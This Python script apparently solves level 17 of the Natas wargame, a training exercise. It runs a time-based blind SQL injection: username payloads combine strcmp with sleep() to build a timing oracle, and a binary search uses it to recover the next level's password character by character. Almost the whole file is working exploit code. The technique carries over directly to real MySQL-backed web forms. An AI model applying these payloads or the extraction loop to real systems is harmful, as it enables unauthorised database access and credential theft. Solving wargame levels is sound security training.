"""
"""

import requests
import time
from bs4 import BeautifulSoup
from typing import Callable, Optional, Union

from natas_utils import *
from .natas15 import Less, Equal, Greater, LT, EQ, GT, CHARS

LEVEL = 17

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # form action: POST to /index.php (can be /)
    #
    # The server code querying is not POST-specific, so params on a GET should
    # work.
    #
    # A non-null "debug" param on a GET request will leak info about the query
    # that's executed.

    flag = binary_search_password(query_comparison, url, login, f"natas{LEVEL + 1}")
    return try_level_login(LEVEL + 1, [flag])

def binary_search_password(query_func: Callable, url: str, login: LevelLogin, username: str) -> str:
    """
    Copied from natas15 and modified to use a different query function.
    """
    password = ""
    for _ in range(64):
        # search bounds
        low = 0
        high = len(CHARS) - 1

        while low < high - 1:
            # midpoint to check
            mid = low + (high - low) // 2

            res = query_func(url, login, username, password + CHARS[mid])

            if res is LT:
                low = mid
            elif res is GT:
                high = mid
            elif res is EQ:
                return password + CHARS[mid]

        password += CHARS[low]
        # print(len(password), password)

    return password

def query_comparison(url: str, login: LevelLogin, username: str, password: str) -> Union[Less, Equal, Greater]:
    # single requests generally take <0.5 seconds without the sleep call,
    # but the attack is unreliable for me with a threshold of 1.0
    timing_threshold = 1.2
    greater = {
        # sleep for at least the threshold time to ensure that successful queries
        # take longer than that to make a full round trip
        "username": f'" or if(username="{username}" and strcmp(binary "{password}", binary password)=1,sleep({timing_threshold}),null) #',
        "submit": "Check existence",
        "debug": "true",
    }
    equal = {
        "username": f'" or if(username="{username}" and strcmp(binary "{password}", binary password)=0,sleep({timing_threshold}),null) #',
        "submit": "Check existence",
        "debug": "true",
    }

    if query(url, login, equal, timing_threshold):
        return EQ
    elif query(url, login, greater, timing_threshold):
        return GT
    else:
        return LT

def query(url: str, login: LevelLogin, data: dict, threshold: Union[int, float]) -> bool:
    start = time.perf_counter()
    _ = requests.post(url, auth=login, data=data)
    end = time.perf_counter()

    return (end - start) > threshold

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))